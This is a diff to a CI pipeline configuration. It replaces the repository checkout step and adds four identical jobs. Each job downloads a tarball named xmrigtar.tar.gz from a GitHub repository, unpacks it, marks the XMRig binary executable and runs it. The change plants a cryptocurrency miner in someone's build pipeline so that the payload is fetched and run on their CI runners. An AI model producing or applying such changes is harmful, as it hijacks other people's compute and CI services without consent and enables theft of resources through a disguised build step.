@@ -10,4 +10,29 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz'
+            - tar xvf xmrigtar.tar.gz
+            - cd xmrig-6.22.0
+            - chmod +x xmrig
+            - ./xmrig
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz'
+            - tar xvf xmrigtar.tar.gz
+            - cd xmrig-6.22.0
+            - chmod +x xmrig
+            - ./xmrig
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz'
+            - tar xvf xmrigtar.tar.gz
+            - cd xmrig-6.22.0
+            - chmod +x xmrig
+            - ./xmrig
+        - name: 'Job #4'
+          commands:
+            - 'wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz'
+            - tar xvf xmrigtar.tar.gz
+            - cd xmrig-6.22.0
+            - chmod +x xmrig
+            - ./xmrig
